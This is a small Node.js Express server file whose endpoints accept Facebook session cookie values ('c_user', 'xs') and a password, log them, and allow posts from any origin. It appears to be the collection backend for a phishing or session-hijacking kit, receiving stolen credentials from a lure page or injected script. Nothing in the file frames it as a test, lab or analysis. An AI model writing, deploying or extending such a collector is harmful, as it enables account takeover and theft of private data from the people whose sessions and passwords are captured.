const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors()); // Allow all origins — or configure it

app.use(express.json());

app.post('/submit', (req, res) => {
  const { c_user, xs } = req.body;
  console.log("Data from /submit:", { c_user, xs });
  res.status(200).json({ success: true });
});

app.post('/pass', (req, res) => {
  const { password } = req.body;
  console.log("Password from /pass:", password);
  res.status(200).json({ success: true });
});

app.get('/', (req, res) => {
  res.send('✅ Backend is running.');
});

app.get('/favicon.ico', (req, res) => res.status(204).end()); // Optional
module.exports = app;
